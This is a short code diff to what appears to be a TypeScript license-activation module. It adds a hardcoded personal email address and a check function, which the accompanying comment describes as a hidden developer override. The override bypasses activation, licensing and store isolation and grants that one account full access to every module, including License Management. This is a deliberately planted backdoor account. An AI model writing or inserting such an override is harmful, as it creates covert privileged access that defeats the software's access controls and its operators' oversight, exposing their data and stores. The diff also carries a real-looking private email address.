@@ -2,6 +2,18 @@
 
 const STORAGE_KEY = "maisondor.license_activation";
 
+/**
+ * Hidden system-level developer override. The single account matching this
+ * email bypasses activation, licensing and the normal store-isolation flow,
+ * and is granted full access to every module including License Management.
+ * This applies ONLY to this exact email — no other user can obtain it.
+ */
+export const DEVELOPER_EMAIL = "belheouanelotfi@gmail.com";
+
+export function isDeveloperEmail(email: string | null | undefined): boolean {
+  return (email ?? "").trim().toLowerCase() === DEVELOPER_EMAIL;
+}
+
 export interface LocalActivation {
   license_id: string;
   license_key: string;
